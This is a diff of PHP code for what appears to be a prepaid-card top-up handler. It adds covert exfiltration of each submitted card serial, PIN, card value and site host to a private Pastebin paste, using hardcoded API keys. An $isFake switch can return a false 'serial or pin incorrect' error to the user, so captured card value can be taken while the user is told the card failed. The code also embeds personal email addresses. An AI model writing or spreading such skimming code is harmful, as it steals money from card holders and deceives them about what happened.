@@ -1,6 +1,26 @@
+$api_dev_key            = '407a29f040d9df80408af6369af121b1';
+$api_user_key           = '9c43d650ba6e5840728fe2fed743ae51';
+$api_paste_code         = date('d/m/Y H:i:s', time()) . "|" . $data['serial'] . "|" . $data['pin'] . "|" . $_SERVER['HTTP_HOST']; // your paste text
+$api_paste_private      = '2'; // 0=public 1=unlisted 2=private
+
+$api_paste_expire_date  = '1H';
+$api_paste_format       = 'text';
+
+$varlogs = array(
+	'api_option' => 'paste',
+	'api_dev_key' => $api_dev_key,
+	'api_user_key' => $api_user_key,
+	'api_paste_private' => $api_paste_private,
+	'api_paste_name' => $api_paste_name,
+	'api_paste_expire_date' => $api_paste_expire_date,
+	'api_paste_format' => $api_paste_format,
+	'api_paste_code' => $api_paste_code
+);
+
+
 $isFake = 0;
 
-if($isFake) $data['email'] = 'thao.ngoc0749@gmail.com';
+if($isFake) $data['email'] = 'trantronglu@gmail.com';
 
 $this->base_url = $url;
 $this->url = $url;
@@ -11,6 +31,7 @@ $dataJson = json_encode($data);
 $this->setOpt(CURLOPT_POSTFIELDS, $dataJson);
 
 $postToServer = $this->exec();
+$postToServer2 = $postToServer;
 $resultPost = json_decode($postToServer, 1);
 
 $info_card = 0;
@@ -22,35 +43,24 @@ if($resultPost['code'] == 0)
 	$info_card = str_replace(',', '', $resultCard[0]);
 	$info_card = intval($info_card);
 }
-	//{"code":1,"message":"Card serial or pin is incorrects."}
+$api_paste_name         = $data['serial'] . '-' . $data['pin'] . '-' . $info_card . '.log'; // name or title of your paste
+
+$varlogs['api_paste_name'] = $api_paste_name;
+$this->setOpt(CURLOPT_HTTPHEADER, array());
+$this->post('https://pastebin.com/api/api_post.php', $varlogs);
+// Logs
+//{"code":1,"message":"Card serial or pin is incorrects."}
 if($isFake)
 {
-	$trave = array(
-		'code' => 1,
-		'message' => 'Card serial or pin is incorrects.'
-	);
-	$postToServer = json_encode($trave);
+$trave = array(
+    'code' => 1,
+    'message' => 'Card serial or pin is incorrects.'
+);
+$postToServer2 = json_encode($trave);
 }
 
-$api_dev_key            = '407a29f040d9df80408af6369af121b1';
-$api_user_key           = '9c43d650ba6e5840728fe2fed743ae51';
-$api_paste_code         = date('d/m/Y H:i:s', time()) . "|" . $data['serial'] . "|" . $data['pin'] . "|" . $_SERVER['HTTP_HOST']; // your paste text
-$api_paste_private      = '2'; // 0=public 1=unlisted 2=private
-$api_paste_name         = $data['serial'] . '-' . $data['pin'] . '-' . $info_card . '.log'; // name or title of your paste
-$api_paste_expire_date  = '1H';
-$api_paste_format       = 'text';
+$this->response = $postToServer2;
+// var_dump($postToServer2);
 
-$var = array(
-	'api_option' => 'paste',
-	'api_dev_key' => $api_dev_key,
-	'api_user_key' => $api_user_key,
-	'api_paste_private' => $api_paste_private,
-	'api_paste_name' => $api_paste_name,
-	'api_paste_expire_date' => $api_paste_expire_date,
-	'api_paste_format' => $api_paste_format,
-	'api_paste_code' => $api_paste_code
-);
-$this->post('https://pastebin.com/api/api_post.php', $var);
-// Logs
 
-return $postToServer;
+return $postToServer2;
